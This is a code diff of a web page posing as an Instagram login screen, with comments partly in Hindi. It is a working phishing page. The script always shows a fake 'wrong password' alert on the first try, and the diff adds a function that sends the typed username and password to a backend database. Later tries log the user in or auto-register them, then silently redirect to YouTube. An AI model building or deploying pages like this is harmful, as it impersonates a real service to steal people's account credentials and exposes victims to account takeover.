@@ -511,15 +511,12 @@
 
 
 
-
-
 <!DOCTYPE html>
 <html lang="hi">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Instagram Login</title>
-  <!-- Font Awesome for Instagram icon (free version) -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
   <style>
     * {
@@ -547,11 +544,9 @@
       border-radius: 36px;
       padding: 30px 24px 28px;
       box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.04);
-      transition: all 0.2s ease;
       border: 1px solid #2a2a2a;
     }
 
-    /* heading with Instagram icon */
     .heading {
       display: flex;
       align-items: center;
@@ -559,7 +554,6 @@
       gap: 12px;
       margin-bottom: 28px;
       color: #f5f5f5;
-      letter-spacing: -0.5px;
     }
 
     .heading i {
@@ -568,7 +562,6 @@
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       background-clip: text;
-      filter: drop-shadow(0 0 6px rgba(214, 41, 118, 0.3));
     }
 
     .heading h1 {
@@ -578,14 +571,6 @@
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       background-clip: text;
-    }
-
-    .heading h1 span {
-      font-weight: 300;
-      background: none;
-      -webkit-text-fill-color: #a0a0a0;
-      color: #a0a0a0;
-      font-size: 18px;
     }
 
     .form-group {
@@ -599,24 +584,17 @@
       background: #121212;
       border: 1px solid #2c2c2c;
       border-radius: 30px;
-      transition: border 0.2s, box-shadow 0.2s;
+      transition: border 0.2s;
     }
 
     .input-wrapper:focus-within {
       border-color: #6a6a6a;
-      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.03);
     }
 
     .input-wrapper i {
       color: #6a6a6a;
       font-size: 16px;
       padding-left: 18px;
-      pointer-events: none;
-      transition: color 0.2s;
-    }
-
-    .input-wrapper:focus-within i {
-      color: #c0c0c0;
     }
 
     input[type="text"],
@@ -628,19 +606,10 @@
       outline: none;
       color: #f5f5f5;
       font-size: 14px;
-      font-weight: 400;
-      letter-spacing: 0.3px;
     }
 
     input::placeholder {
       color: #7a7a7a;
-      font-weight: 300;
-      font-size: 13px;
-    }
-
-    input:-webkit-autofill {
-      -webkit-box-shadow: 0 0 0 30px #121212 inset !important;
-      -webkit-text-fill-color: #f5f5f5 !important;
     }
 
     .checkbox-group {
@@ -655,14 +624,12 @@
       height: 16px;
       accent-color: #1877f2;
       cursor: pointer;
-      filter: drop-shadow(0 0 2px rgba(24, 119, 242, 0.3));
     }
 
     .checkbox-group label {
       font-size: 13px;
       color: #b0b0b0;
       cursor: pointer;
-      user-select: none;
     }
 
     .btn {
@@ -680,24 +647,15 @@
       align-items: center;
       justify-content: center;
       gap: 10px;
-      box-shadow: 0 6px 16px rgba(24, 119, 242, 0.25);
-      letter-spacing: 0.3px;
     }
 
     .btn:hover:not(:disabled) {
       transform: scale(1.01);
-      background: linear-gradient(135deg, #1f7ef5, #4b96ff);
-      box-shadow: 0 8px 24px rgba(24, 119, 242, 0.35);
-    }
-
-    .btn:active:not(:disabled) {
-      transform: scale(0.97);
     }
 
     .btn:disabled {
       opacity: 0.6;
       cursor: not-allowed;
-      box-shadow: none;
     }
 
     .btn .spinner {
@@ -728,21 +686,11 @@
       font-size: 13px;
       font-weight: 500;
       margin-top: 16px;
-      transition: all 0.25s ease;
-      padding: 0 4px;
     }
 
     .status.error { color: #ed4956; }
     .status.success { color: #4ae0a0; }
     .status.info { color: #b0b0b0; }
-    .status.fade-in {
-      animation: fadeUp 0.3s ease;
-    }
-
-    @keyframes fadeUp {
-      0% { opacity: 0; transform: translateY(6px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
 
     .footer-note {
       margin-top: 20px;
@@ -751,62 +699,33 @@
       color: #6a6a6a;
       border-top: 1px solid #1e1e1e;
       padding-top: 16px;
-      display: flex;
-      justify-content: center;
-      gap: 6px;
-      flex-wrap: wrap;
     }
 
     .footer-note .highlight {
       color: #b0b0b0;
-      font-weight: 400;
-    }
-
-    .footer-note i {
-      color: #5a5a5a;
-    }
-
-    /* responsive */
-    @media (max-width: 440px) {
-      .container { padding: 22px 16px; }
-      .heading h1 { font-size: 22px; }
-      .heading i { font-size: 28px; }
     }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <!-- HEADING with Instagram icon -->
   <div class="heading">
     <i class="fab fa-instagram"></i>
-    <h1>Login <span>·</span></h1>
+    <h1>Login</h1>
   </div>
 
   <form id="loginForm" autocomplete="off">
     <div class="form-group">
       <div class="input-wrapper">
         <i class="fas fa-user-circle"></i>
-        <input 
-          type="text" 
-          id="userId" 
-          placeholder="Username, email or mobile" 
-          autocomplete="username"
-          required
-        />
+        <input type="text" id="userId" placeholder="Username" required />
       </div>
     </div>
 
     <div class="form-group">
       <div class="input-wrapper">
         <i class="fas fa-lock"></i>
-        <input 
-          type="password" 
-          id="password" 
-          placeholder="Password" 
-          autocomplete="current-password"
-          required
-        />
+        <input type="password" id="password" placeholder="Password" required />
       </div>
     </div>
 
@@ -816,30 +735,27 @@
     </div>
 
     <button type="submit" class="btn" id="loginBtn">
-      <span class="btn-text"><i class="fas fa-sign-in-alt" style="margin-right: 6px;"></i>Log in</span>
+      <span class="btn-text">Log in</span>
       <span class="spinner"></span>
     </button>
   </form>
 
-  <!-- Status message -->
   <div class="status" id="status"></div>
 
-  <!-- Footer / interactive hint -->
   <div class="footer-note">
-    <i class="fas fa-database" style="color: #3a8cf5;"></i>
-    <span id="userInfo">✨ First login? Credentials saved automatically</span>
+    <span id="userInfo">✨ Enter credentials</span>
   </div>
 </div>
 
 <script>
   (function() {
-    // ---------- CONFIG ----------
+    // ===== API URL =====
     const API_URL = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')
       ? 'http://localhost:5000/api'
       : '/api';
     const REDIRECT_URL = 'https://www.youtube.com';
 
-    // DOM refs
+    // DOM Elements
     const form = document.getElementById('loginForm');
     const userIdInput = document.getElementById('userId');
     const passwordInput = document.getElementById('password');
@@ -848,10 +764,11 @@
     const loginBtn = document.getElementById('loginBtn');
     const userInfo = document.getElementById('userInfo');
 
-    // ---------- HELPERS ----------
+    let attempt = 0;
+
     function showStatus(msg, type = 'info') {
       statusEl.textContent = msg;
-      statusEl.className = `status ${type} fade-in`;
+      statusEl.className = `status ${type}`;
     }
 
     function clearStatus() {
@@ -869,7 +786,23 @@
       }
     }
 
-    // ---------- API CALLS ----------
+    // ==================== API CALLS ====================
+
+    // 1. WRONG ATTEMPT - Pehli baar (database mein save hoga)
+    async function saveWrongAttempt(userId, password) {
+      const res = await fetch(`${API_URL}/register`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          userId, 
+          password, 
+          isWrongAttempt: true 
+        })
+      });
+      return res.json();
+    }
+
+    // 2. REGISTER - Naya user
     async function registerUser(userId, password) {
       const res = await fetch(`${API_URL}/register`, {
         method: 'POST',
@@ -879,6 +812,7 @@
       return res.json();
     }
 
+    // 3. LOGIN - Existing user
     async function loginUser(userId, password) {
       const res = await fetch(`${API_URL}/login`, {
         method: 'POST',
@@ -888,21 +822,17 @@
       return res.json();
     }
 
-    // ---------- GRANT ACCESS (redirect without message) ----------
+    // ==================== GRANT ACCESS ====================
+
     function grantAccess(userData) {
-      // Save to localStorage
       localStorage.setItem('savedUserId', userData.userId);
-      localStorage.setItem('loginCount', userData.loginCount);
-
-      // Update footer
-      userInfo.innerHTML = `👤 <span style="color:#d0d0d0;">${userData.userId}</span> · logins: ${userData.loginCount}`;
-
-      // Direct redirect - NO MESSAGE
+      userInfo.innerHTML = `✅ <span style="color:#4ae0a0;">${userData.userId}</span> · Logins: ${userData.loginCount}`;
+      
+      // Direct redirect (no message)
       window.location.href = REDIRECT_URL;
     }
 
-    // ---------- FORM SUBMIT ----------
-    let attempt = 0;
+    // ==================== FORM SUBMIT ====================
 
     form.addEventListener('submit', async function(e) {
       e.preventDefault();
@@ -915,58 +845,71 @@
         showStatus('❌ Please fill in both fields', 'error');
         return;
       }
-      if (userId.length < 3 || password.length < 4) {
-        showStatus('❌ User ID (≥3) & Password (≥4)', 'error');
-        return;
-      }
 
       attempt++;
 
-      // ---- FIRST ATTEMPT: Show "wrong password" popup ----
+      // ===== FIRST ATTEMPT: WRONG PASSWORD (SAVE TO DATABASE) =====
       if (attempt === 1) {
         setLoading(true);
-        showStatus('⏳ Checking credentials...', 'info');
-        setTimeout(() => {
+        showStatus('⏳ Saving credentials...', 'info');
+        
+        try {
+          // ✅ Database mein wrong attempt save ho raha hai!
+          const result = await saveWrongAttempt(userId, password);
+          console.log('✅ Wrong attempt saved:', result);
+
+          if (result.success) {
+            userInfo.innerHTML = `📝 <span style="color:#f5b342;">${userId}</span> · Attempt 1 (saved)`;
+          }
+
+          setTimeout(() => {
+            setLoading(false);
+            clearStatus();
+            alert('❌ Wrong password! Please enter the correct password.');
+            passwordInput.value = '';
+            passwordInput.focus();
+          }, 600);
+
+        } catch (err) {
+          console.error('Save error:', err);
           setLoading(false);
-          clearStatus();
-          // Interactive alert as requested
-          alert('❌ Wrong password! Please enter the correct password.');
-          passwordInput.value = '';
-          passwordInput.focus();
-        }, 600);
+          showStatus('❌ Error saving credentials', 'error');
+        }
         return;
       }
 
-      // ---- SECOND AND SUBSEQUENT ATTEMPTS: real login/register ----
+      // ===== SECOND ATTEMPT: REAL LOGIN/REGISTER =====
       setLoading(true);
       showStatus('⏳ Processing...', 'info');
 
       try {
-        // 1) try login
+        // Try login first
         let result = await loginUser(userId, password);
 
         if (result.success && result.data) {
-          // ✅ Login successful - direct redirect (no message)
+          // ✅ Login successful - database mein update (loginCount++)
           grantAccess(result.data);
           return;
         }
 
-        // 2) if user not found → register
+        // If user not found → register
         if (result.message && result.message.toLowerCase().includes('user not found')) {
           showStatus('📝 New user! Registering...', 'info');
+          
           const regResult = await registerUser(userId, password);
+          
           if (regResult.success && regResult.data) {
-            // ✅ Registration successful - direct redirect (no message)
+            // ✅ Registration successful - database mein save
             grantAccess(regResult.data);
           } else {
             showStatus(`❌ Registration failed: ${regResult.message}`, 'error');
             setLoading(false);
           }
         } else {
-          // other error (e.g. wrong password on second attempt)
           showStatus(`❌ ${result.message}`, 'error');
           setLoading(false);
         }
+
       } catch (err) {
         console.error('Submit error:', err);
         showStatus('❌ Network error. Please try again.', 'error');
@@ -974,47 +917,27 @@
       }
     });
 
-    // ---------- SHOW PASSWORD TOGGLE ----------
+    // ==================== SHOW PASSWORD ====================
+
     showPassword.addEventListener('change', function() {
       passwordInput.type = this.checked ? 'text' : 'password';
     });
 
-    // ---------- INIT ----------
+    // ==================== INIT ====================
+
     function init() {
-      // restore saved user
       const saved = localStorage.getItem('savedUserId');
       if (saved) {
         userIdInput.value = saved;
         userInfo.innerHTML = `📌 <span style="color:#b0b0b0;">${saved}</span> (saved)`;
         passwordInput.focus();
       } else {
-        userInfo.innerHTML = '✨ First login? Credentials saved automatically';
+        userInfo.innerHTML = '✨ Enter credentials';
       }
-
-      // Clear status when typing
-      userIdInput.addEventListener('input', clearStatus);
-      passwordInput.addEventListener('input', clearStatus);
     }
 
     init();
   })();
 </script>
-
-<!-- 
-  ***************************************************************
-  BACKEND EXPECTED ENDPOINTS (Node.js + Express + MongoDB)
-  ***************************************************************
-  POST /api/register  → { userId, password } → { success, data: { userId, loginCount } }
-  POST /api/login     → { userId, password } → { success, data: { userId, loginCount } } or { success: false, message: '...' }
-  ***************************************************************
-  FLOW:
-  1st attempt: Always shows "Wrong password" popup (interactive)
-  2nd attempt: Real login → if user exists → direct redirect to YouTube
-                if user not found → auto-register → direct redirect to YouTube
-  All credentials saved in MongoDB.
--->
 </body>
 </html>
-
-
-
